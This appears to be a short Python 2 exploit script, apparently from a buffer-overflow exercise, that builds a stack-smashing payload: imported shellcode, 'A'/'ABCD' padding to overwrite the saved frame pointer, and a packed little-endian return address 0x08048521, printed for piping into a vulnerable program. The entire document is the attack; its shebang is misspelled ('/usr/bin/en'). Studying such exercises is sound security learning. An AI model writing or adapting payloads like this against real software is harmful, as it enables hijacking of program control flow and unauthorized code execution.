#!/usr/bin/en python
from struct import pack
from shellcode import shellcode
sfp = 'A'+'ABCD'*22
shellcode_addr = pack("<I",  0x08048521)
print shellcode+sfp+shellcode_addr
